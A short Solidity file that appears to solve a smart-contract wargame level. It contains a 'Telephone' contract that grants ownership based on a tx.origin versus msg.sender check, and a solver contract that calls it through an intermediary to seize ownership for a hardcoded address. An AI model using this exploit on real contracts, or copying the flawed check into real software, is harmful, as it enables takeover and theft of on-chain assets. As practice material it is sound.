// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract telephoneSolver {

    function solve() external returns (bytes memory) {
        address contractAddr = address(0x03cbED7039bDA6ae4523C6E7BB6579718A584f83);
        ITelephone telephoneContract = ITelephone(contractAddr);
        telephoneContract.changeOwner(address(0x798349E06c67272465123B91bd88C5d19b8c7878));
    }
}
